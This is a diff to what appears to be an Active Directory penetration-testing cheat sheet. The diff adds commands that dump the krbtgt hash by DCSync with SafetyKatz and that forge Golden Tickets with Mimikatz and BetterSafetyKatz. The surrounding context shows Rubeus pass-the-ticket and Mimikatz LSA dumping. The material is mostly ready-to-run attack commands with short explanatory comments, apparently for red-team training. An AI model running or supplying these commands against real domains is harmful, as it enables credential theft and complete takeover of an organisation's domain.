@@ -658,8 +658,6 @@ Rubeus.exe asktgt /user:administrator /rc4:<ntlmhash> /ptt
 
 # Pass-the-Hash (pth): can be done by non joined machine but requires NTLM hash and doesn't create Kerberos
 # Doesn't work if the domain is configured to not accept NTLM authentication
-
-# DCsync
 ```
 
 - **Lateral movement with .NET Tools:**
@@ -746,11 +744,20 @@ winrs -r server cmd
 ```powershell
 # Execute mimikatz on DC as DA to get hashes (especially the krbtgt hash)
 Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
+# Or use DCSync with SafetyKatz (this doesn't execute anything on DC and requires just permssion of AD replication, not full 
+SafetyKatz "lsadump::dcsync /user:dcorp\krbtgt" "exit"
+
 # Golden Ticket: use the hash from krbtgt to impersonate Administrator using pass-the-ticket technique). 
 # Works until krbtgt password is changed two times. Ticket is valid for 10800 minutes (7 days). Can be more (10 years)
 # It can impersonate any user in domain, not only administrator
-Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:corporate.corp.local /sid:S-1-5-21-1324567831-1543786197-145643786 /krbtgt:0c88028bf3aa6a6a143ed846f2be1ea4 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
+Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:corporate.corp.local /sid:S-1-5-21-1324567831-1543786197-145643786 /aes256:XXX /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
+# Or
+BetterSafetyKatz "kerberos::golden /User:Administrator /domain:corporate.corp.local /sid:S-1-5-21-1324567831-1543786197-145643786 /aes256:XXX  /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
+
+# Instead of /ptt (which passes the ticket to the interactive session), /ticket can be used to save the ticket to a file (to be reused)
+
 ```
+
 
 ### Silver Ticket
 
